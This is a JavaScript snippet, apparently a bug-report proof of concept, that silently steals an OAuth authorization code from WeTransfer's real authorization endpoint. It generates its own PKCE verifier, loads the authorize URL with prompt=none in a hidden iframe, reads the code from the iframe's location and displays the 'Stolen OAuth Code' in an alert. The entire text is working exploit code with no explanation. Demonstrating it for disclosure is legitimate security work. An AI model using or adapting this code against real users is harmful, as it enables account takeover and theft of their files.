(async () => {
  const v = Array.from(crypto.getRandomValues(new Uint8Array(32)), b => b.toString(16).padStart(2, '0')).join('');
  const h = new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(v)));
  const c = btoa(String.fromCharCode(...h)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

  const f = document.createElement('iframe');
  f.style.display = 'none';
  f.src = 'https://auth.wetransfer.com/authorize?response_mode=web_message&prompt=none&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&response_type=code&redirect_uri=https%3A%2F%2Fwetransfer.com%2Faccount%2Fsilent-callback&code_challenge=' + encodeURIComponent(c) + '&code_challenge_method=S256&state=poc';

  f.onload = () => {
    try {
      const url = f.contentWindow.location.href;
      const code = new URLSearchParams(new URL(url).search).get('code');
      if (code) {
        alert('Stolen OAuth Code:\n' + code + '\n\nCode Verifier:\n' + v);
      }
    } catch (e) {}
  };

  document.body.appendChild(f);
})();
